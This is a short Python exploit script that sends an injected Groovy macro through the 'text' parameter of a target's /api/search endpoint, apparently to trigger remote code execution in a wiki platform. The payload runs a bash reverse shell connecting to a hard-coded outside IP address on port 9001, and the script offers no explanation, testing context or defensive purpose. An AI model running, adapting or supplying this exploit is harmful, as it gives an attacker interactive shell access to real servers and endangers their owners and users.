import sys
from urllib.parse import urlencode
from urllib.request import urlopen

payload = '}}}{{async async=false}}{{groovy}}println("/bin/bash -i >& /dev/tcp/155.138.212.170/9001 0>&1".execute().text){{/groovy}}{{/async}}'
query = urlencode({"media": "rss", "text": payload})
urlopen(sys.argv[1].rstrip("/") + "/api/search?" + query).read()
